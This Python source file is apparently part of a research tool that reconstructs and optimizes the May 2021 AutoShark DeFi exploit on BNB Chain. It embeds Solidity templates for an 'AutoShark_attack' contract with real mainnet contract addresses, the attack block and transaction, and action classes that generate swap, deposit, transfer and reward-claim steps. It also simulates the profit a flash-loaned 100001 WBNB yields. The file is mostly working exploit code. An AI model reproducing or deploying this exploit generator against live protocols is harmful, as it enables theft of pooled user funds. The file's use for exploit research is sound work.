import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert, newaxis
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from Actions.SingleApprox.SingleApprox import single_round_approx, single_round_approx2, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *



class AutoSharkAction():
    initialStates = [140153, 402162, 2288214, 1519892, 723379, 0, 0]
    globalStates = initialStates.copy()
    # globalStates[0]: WBNB liquidity
    # globalStates[1]: SHARK liquidity
    # globalStates[2]: Uniswap LP totalSupply
    # globalStates[3]: Strategy Pool
    # globalStates[4]: Strategy Total Supply
    # globalStates[5]: WBNB flip balance
    # globalStates[6]: SHARK flip balance

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/AutoSharkI.sol";
//Timestamp  	2021-05-24 21:41:49(UTC)
//Block number 	7698696
//Gas limit  	2491833
//Gas used  1283321
//tx: 0xfbe65ad3eed6b28d59bf6043debf1166d3420d214020ef54f12d2e0583a66f13


contract AutoShark_attack {
    address private EOA;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private WBNBAddress = payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address private PantherRouterAddress = 0x24f7C33ae5f77e2A9ECeed7EA858B4ca2fa1B7eC;
    address private SharkAddress = 0xf7321385a461C4490d5526D83E63c366b149cB15;
    address private SharkMintAddress = 0x37ee638d85e420532e35cD9dD831166514855e6D;
    address private PantherSwapWBNB2SHARKAddress = 0x1fd789Fa513871Cb89Aa655F11ec777cAD1784a0;
    address private StrategyCompoundFLIPAddress = 0xa007D347F2E55d731e101AaE64722C321b2B80dC;
    

    IBEP20 BUSD = IBEP20(BUSDAddress);
    IWBNB WBNB = IWBNB(payable(WBNBAddress));
    IBEP20 SHARK = IBEP20(SharkAddress);
    IPantherRouter PancakeRouter = IPantherRouter(PantherRouterAddress);
    ISharkMint SharkMint = ISharkMint(SharkMintAddress);
    IStrategyCompoundFLIP StrategyCompoundFLIP= IStrategyCompoundFLIP(StrategyCompoundFLIPAddress);
    IPantherSwap PantherSwap = IPantherSwap(PantherSwapWBNB2SHARKAddress);


    address[] ad;

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";

    uint reserve0;
    uint reserve1;
    uint SHARKAmount;

    constructor() payable {
        require(msg.value == 100001 * 10 ** 18, "loan amount does not match");
        WBNB.deposit{value: 100001 * 10 ** 18}();
        WBNB.approve( PantherRouterAddress,  2 ** 256 - 1);
        SHARK.approve( PantherRouterAddress,  2 ** 256 - 1);
        PantherSwap.approve( StrategyCompoundFLIPAddress, 2 ** 256 - 1 );
        EOA = msg.sender;

        ad = new address[](2);
    }

    receive() external payable {}
    '''

    startStr_attack = '''    // loan amount = 100001 WBNB
    function attack( $$_$$ ) public {
    '''

    endStr_attack = '''        revert(ProfitSummary());
    }
    '''

    endStr_contract = '''function flipBalance() internal returns (string memory) {
        uint WBNBbalance = WBNB.balanceOf(SharkMintAddress) / 10 ** 16;
        uint SHARKbalance = SHARK.balanceOf(SharkMintAddress) / 10 ** 18;
        str89 = append("WBNB flip balance: ", uint2str(WBNBbalance));
        str90 = append("SHARK flip balance: ", uint2str(SHARKbalance));
        return appendWithSpace(str89, str90);
    }

    function StrategyCompoundFLIPSummary() internal returns (string memory) {
        uint pool = StrategyCompoundFLIP.balance() / 10 ** 16;
        uint totalSupply = StrategyCompoundFLIP.totalSupply() / 10 ** 14;
        str89 = append("Strategy Pool: ", uint2str(pool));
        str90 = append(" Total Supply: ", uint2str(totalSupply));
        return appendWithSpace(str89, str90);
    }


    function PancakeSwapReserves() internal returns (string memory) {
        ( reserve0, reserve1, ) = PantherSwap.getReserves();
        str89 = append("WBNB liquidity: ", uint2str(reserve0 / 10 ** 16));
        str90 = append("  SHARK liquidity: ", uint2str(reserve1 / 10 ** 18));
        return append(str89, str90);
    }


    function PancakeSwapSummary() internal returns (string memory) {
        ( reserve0, reserve1, ) = PantherSwap.getReserves();
        uint totalSupply = PantherSwap.totalSupply();
        str89 = append("WBNB liquidity: ", uint2str(reserve0 / 10 ** 16));
        str90 = append("  SHARK liquidity: ", uint2str(reserve1 / 10 ** 18));
        str91 = append("  TotalSupply: ", uint2str(totalSupply / 10 ** 16));
        return append(append(str89, str90), str91);
    }

    

    function ProfitSummary() internal returns (string memory _uintAsString) {
        uint balance0 = WBNB.balanceOf(address(this)) / 10 ** 16;
        return append("WBNB balance: ", uint2str(balance0));
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }     

}

    '''

    initialBalances = {"WBNB": 10000100}
    currentBalances = {"WBNB": 10000100}
    TargetTokens = {'WBNB'}
    TokenPrices = {'WBNB': 0.01}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1:
            return 0
        if stats[0] == 20:
            return 0
        profit = stats[0] - 10000100
        #        WBNB
        return profit / 100

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = SwapPancakeWBNB2LP  # Pancakeswap  # precise
        action2 = DepositStrategy  # Approximated
        action3 = TransferLPStrategy  # Approximated
        action4 = SwapPancakeWBNB2SHARK # precise
        action5 = TransferWBNBStrategy  # precise
        action6 = TransferSHARKStrategy  # precise
        action7 = GetRewardStrategy  # Approximated
        action8 = SwapPancakeSHARK2WBNB  # Pancakeswap # precise

        action_list_1 = [action2, action3, action7]

        # action1_prestate_dependency = [action2, action5]
        action2_prestate_dependency = [action1, action8]
        action3_prestate_dependency = [action1, action2, action8]
        # action4_prestate_dependency = [action1, action2, action3, action8]
        # action5_prestate_dependency = [action1, action2, action3, action4, action6]
        # action6_prestate_dependency = [action1, action2, action3, action4, action5]
        action7_prestate_dependency = [action1, action2, action3, action4, action5, action6]

        # # # seq of actions
        ActionWrapper = AutoSharkAction
        action_lists = [action2_prestate_dependency + [action2], \
                        action3_prestate_dependency + [action3]]
        action_lists2 = [action7_prestate_dependency + [action7]]
        
        start = time.time()
        initialPassCollectData(action_lists, ActionWrapper)
        initialPassCollectData2(action_lists2, ActionWrapper)

        ShowDataPointsForEachAction(action_list_1)
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return


class SwapPancakeWBNB2LP(AutoSharkAction):
    # Action Specific Variables
    numInputs = 1
    tokensIn = ['WBNB']
    tokensOut = ['LP']
    range = [0, 70]   # 50

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        SHARKAmount = SHARK.balanceOf(address(this));
        ad[0] = WBNBAddress;
        ad[1] = SharkAddress;
        PancakeRouter.swapExactTokensForTokens($$ * 10 ** 16 , 0, ad, address(this),  16218925690);
        SHARKAmount = SHARK.balanceOf(address(this)) - SHARKAmount;
        (reserve0, reserve1, ) = PantherSwap.getReserves();
        SHARK.transfer(PantherSwapWBNB2SHARKAddress, SHARKAmount);
        WBNB.transfer(PantherSwapWBNB2SHARKAddress, SHARKAmount * reserve0 / reserve1);
        PantherSwap.mint(address(this)); \n'''
        return action

    @classmethod
    def simulate(cls, input):
        # step 1: swap WBNB for SHARK
        newWBNBLiquidity = cls.globalStates[0] + input
        SHARKOut = 997 * input * cls.globalStates[1] / (1000 * cls.globalStates[0] + 997 * input)
        newSHARKLiquidity = cls.globalStates[1] - SHARKOut

        # step 2: swap SHARK for LP
        LPGot = SHARKOut / newSHARKLiquidity * cls.globalStates[2]
        WBNBCost = SHARKOut * newWBNBLiquidity / newSHARKLiquidity
        newSHARKLiquidity = newSHARKLiquidity + SHARKOut  
        newWBNBLiquidity = newWBNBLiquidity + WBNBCost
        return newWBNBLiquidity, newSHARKLiquidity, WBNBCost, LPGot

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances['WBNB'] -= input

        newWBNBLiquidity, newSHARKLiquidity, WBNBCost, LPGot = cls.simulate(input)
        cls.globalStates[0] = newWBNBLiquidity
        cls.globalStates[1] = newSHARKLiquidity
        if "LP" not in cls.currentBalances:
            cls.currentBalances["LP"] = LPGot
        else:
            cls.currentBalances["LP"] += LPGot
        cls.currentBalances['WBNB'] -= WBNBCost
        cls.globalStates[2] += LPGot

        return

    @classmethod
    def string(cls):
        return cls.__name__

class SwapPancakeWBNB2SHARK(AutoSharkAction):
    # Action Specific Variables
    numInputs = 1
    tokensIn = ['WBNB']
    tokensOut = ['SHARK']
    range = [0, 5000000]   # 5000000

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        ad[0] = WBNBAddress;
        ad[1] = SharkAddress;
        PancakeRouter.swapExactTokensForTokens($$ * 10 ** 16 , 0, ad, address(this),  16218925690); \n'''
        return action

    @classmethod
    def simulate(cls, input):
        newWBNBLiquidity = cls.globalStates[0] + input
        SHARKOut = 997 * input * \
            cls.globalStates[1] / (1000 * cls.globalStates[0] + 997 * input)
        newSHARKLiquidity = cls.globalStates[1] - SHARKOut
        return newWBNBLiquidity, newSHARKLiquidity, SHARKOut

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances['WBNB'] -= input
        newWBNBLiquidity, newSHARKLiquidity, SHARKOut = cls.simulate(input)
        cls.globalStates[0] = newWBNBLiquidity
        cls.globalStates[1] = newSHARKLiquidity
        if "SHARK" not in cls.currentBalances:
            cls.currentBalances["SHARK"] = SHARKOut
        else:
            cls.currentBalances["SHARK"] += SHARKOut
        return

    @classmethod
    def string(cls):
        return cls.__name__

class DepositStrategy(AutoSharkAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['LP']
    tokensOut = ['shares']
    range = [0, 500]   # 406

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        StrategyCompoundFLIP.deposit($$ * 10 ** 16,  PantherRouterAddress); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: DepositStrategy\n"
        action += '''        str1 = StrategyCompoundFLIPSummary();
        uint sharesGot = StrategyCompoundFLIP.balanceOf(address(this));

        StrategyCompoundFLIP.deposit($$ * 10 ** 16,  PantherRouterAddress);

        sharesGot = ( StrategyCompoundFLIP.balanceOf(address(this)) - sharesGot ) / 10 ** 16;
        str2 = StrategyCompoundFLIPSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(sharesGot))));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # Strategy Pool
        cls.values[1].append(v1)  # Strategy Total Supply
        cls.values[2].append(v2)  # shares got

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[3], cls.globalStates[4], input]
        
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['LP'] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[3] = output0
        cls.globalStates[4] = output1

        if "shares" not in cls.currentBalances:
            cls.currentBalances["shares"] = output2
        else:
            cls.currentBalances["shares"] += output2

        return

    @classmethod
    def string(cls):
        return cls.__name__

class TransferLPStrategy(AutoSharkAction):
    points = []
    values = [[]]

    hasNewDataPoints = True

    approximator0 = None

    numInputs = 1
    tokensIn = ['LP']
    tokensOut = ['Earned']
    range = [0, 406] # 205, originally 406

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        PantherSwap.transfer(StrategyCompoundFLIPAddress, $$ * 10 ** 16 ); // Make Earned >= 0   \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: DeposityDAI\n"
        action += '''        str1 = StrategyCompoundFLIPSummary();
        uint earnedGot = StrategyCompoundFLIP.earned(address(this));
        
        PantherSwap.transfer(StrategyCompoundFLIPAddress, $$ * 10 ** 16 ); // Make Earned >= 0
        
        earnedGot = ( StrategyCompoundFLIP.earned(address(this)) - earnedGot ) / 10 ** 12;
        revert(appendWithSpace(str1, uint2str(earnedGot)));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 3:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # Earned got
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[3], cls.globalStates[4],
                  input]
        output0 = cls.approximator0(inputs)
        return output0


    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances['LP'] -= input
        output0 = cls.simulate(input)

        if "Earned" not in cls.currentBalances:
            cls.currentBalances["Earned"] = output0
        else:
            cls.currentBalances["Earned"] += output0
        

    @classmethod
    def string(cls):
        return cls.__name__

class TransferWBNBStrategy(AutoSharkAction):
    numInputs = 1
    tokensIn = ['WBNB']
    tokensOut = []
    range = [0, 7000000]  # 5000000

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        WBNB.transfer(SharkMintAddress, $$ * 10 ** 16);   \n'''
        return action

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances["WBNB"] -= input
        cls.globalStates[5] += input
        return

    @classmethod
    def string(cls):
        return cls.__name__

class TransferSHARKStrategy(AutoSharkAction):
    numInputs = 1
    tokensIn = ['SHARK']
    tokensOut = []
    range = [0, 7000000]  # 5000000

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        SHARK.transfer(SharkMintAddress, $$ * 10 ** 18); \n'''
        return action

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances["SHARK"] -= input
        cls.globalStates[6] += input
        return

    @classmethod
    def string(cls):
        return cls.__name__

class GetRewardStrategy(AutoSharkAction):
    points = []
    values = [[], [], []]
    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 0
    tokensIn = ['Earned', 'shares']
    tokensOut = ["SHARK"]
    range = []

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        StrategyCompoundFLIP.getReward();   \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = StrategyCompoundFLIPSummary();
        str2 = flipBalance();
        uint SHARKgot = SHARK.balanceOf(address(this));
        uint earned = StrategyCompoundFLIP.earned(address(this)) / 10 ** 12;
        uint shares = StrategyCompoundFLIP.balanceOf(address(this)) / 10 ** 16;
        str1 = appendWithSpace(appendWithSpace(appendWithSpace(str1, str2), uint2str(earned)), uint2str(shares));

        StrategyCompoundFLIP.getReward();

        SHARKgot = (SHARK.balanceOf(address(this)) - SHARKgot ) / 10 ** 18; 
        str3 = flipBalance();

        revert(appendWithSpace(appendWithSpace(str1, str3), uint2str(SHARKgot)));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[6], values[7], values[8]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 9:
            return -1

        point = [values[0], values[1], values[2],
                 values[3], values[4], values[5]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # WBNB flip balance
        cls.values[1].append(v1)  # SHARK flip balance
        cls.values[2].append(v2)  # SHARK got

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls):
        inputs = [cls.globalStates[3], cls.globalStates[4],
                  cls.globalStates[5], cls.globalStates[6],
                  cls.currentBalances['Earned'], cls.currentBalances['shares']]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2 = cls.simulate()

        newWBNBLiquidity = cls.globalStates[0] + cls.globalStates[5]
        newSHARKLiquidity = newWBNBLiquidity / cls.globalStates[0] * cls.globalStates[1]
        newLPTotalSupply = newWBNBLiquidity / cls.globalStates[0] * cls.globalStates[2]
        # it's not accurate but let's keep it for now

        cls.globalStates[0] = newWBNBLiquidity
        cls.globalStates[1] = newSHARKLiquidity
        cls.globalStates[2] = newLPTotalSupply

        cls.currentBalances["Earned"] = 0
        cls.globalStates[5] = 0
        cls.globalStates[6] = 0
        if "SHARK" not in cls.currentBalances:
            cls.currentBalances["SHARK"] = output2
        else:
            cls.currentBalances["SHARK"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__

class SwapPancakeSHARK2WBNB(AutoSharkAction):
    # Action Specific Variables
    numInputs = 1
    tokensIn = ['SHARK']
    tokensOut = ['WBNB']
    range = [0, 120000000]   # 110380174

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        ad[0] = SharkAddress;
        ad[1] = WBNBAddress;
        PancakeRouter.swapExactTokensForTokens(uint($$ * 10 ** 18), 0, ad, address(this), 16218925690); \n'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def simulate(cls, input):
        newSHARKLiquidity = cls.globalStates[1] + input
        WBNBOut = 997 * input * \
            cls.globalStates[0] / (1000 * cls.globalStates[1] + 997 * input)
        newWBNBLiquidity = cls.globalStates[0] - WBNBOut
        return newWBNBLiquidity, newSHARKLiquidity, WBNBOut

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances['SHARK'] -= input
        newWBNBLiquidity, newSHARKLiquidity, WBNBOut = cls.simulate(input)
        cls.globalStates[0] = newWBNBLiquidity
        cls.globalStates[1] = newSHARKLiquidity

        cls.currentBalances["WBNB"] += WBNBOut
        return

    @classmethod
    def string(cls):
        return cls.__name__


def main():
    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 1
    config.initialEther = 100001
    config.blockNum = 7698696
    config.contract_name = "AutoShark_attack"


# # Test for initial pass of data collecton:
    AutoSharkAction.initialPass()
    
    # AutoSharkAction.runinitialPass()

    # action1 = SwapPancakeWBNB2LP
    # action2 = DepositStrategy
    # action3 = TransferLPStrategy
    # action4 = SwapPancakeWBNB2SHARK
    # action5 = TransferWBNBStrategy
    # action6 = TransferSHARKStrategy
    # action7 = GetRewardStrategy
    # action8 = SwapPancakeSHARK2WBNB

    # action_list = [action1, action2,  action3, action4,
    #                action5, action6, action7, action8]
    # initial_guess = [50, 406, 205, 5000000, 5000000, 10994, 110380174]

    # ActionWrapper = AutoSharkAction

    

    # # # Optimize(action_list, ActionWrapper)

    # # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 1381.57
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4

if __name__ == '__main__':
    main()
    